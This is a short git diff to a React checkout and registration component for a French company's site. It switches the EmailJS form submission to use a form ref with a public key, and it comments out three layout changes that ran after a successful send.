@@ -7,6 +7,7 @@ export default function Starts() {
   const lastNameRef = useRef(null);
   const emailRef = useRef(null);
   const phoneRef = useRef(null);
+  const formRef = useRef(null); // Add a ref for the form element
   const [selectedPaymentMethod, setSelectedPaymentMethod] = useState('card');
   const [password, setPassword] = useState('');
   const [isLoading, setIsLoading] = useState(false);
@@ -32,12 +33,12 @@ export default function Starts() {
 
   const sendEmail = (event) => {
     event.preventDefault();
-    emailjs.sendForm('gmail-benedikt', 'new-registration', event.target)
+    emailjs.sendForm('gmail-benedikt', 'new-registration', formRef.current, '8SL7vzVHt7qSqEd4i') // Use formRef.current
       .then(() => {
         console.log('SUCCESS!');
-        document.querySelector('.left-column').style.display = 'none';
-        document.querySelector('.right-column').style.width = '100%';
-        document.querySelector('.right-column').style.maxWidth = 'none';
+        // document.querySelector('.left-column').style.display = 'none';
+        // document.querySelector('.right-column').style.width = '100%';
+        // document.querySelector('.right-column').style.maxWidth = 'none';
 
         showStep(2); // Move to the confirmation step after successful email sending
       })
@@ -95,7 +96,7 @@ export default function Starts() {
         <p className='secure footer'>© 2024 - Tous droits réservés -  Collective SAS</p>
       </div>
       <div className="right-column">
-        <form className="checkout-form" onSubmit={sendEmail}>
+        <form className="checkout-form" onSubmit={sendEmail} ref={formRef}> {/* Add ref to the form */}
           <input type="hidden" name="website" value='collective-partners' />
 
           <div className='checkout-step active'>
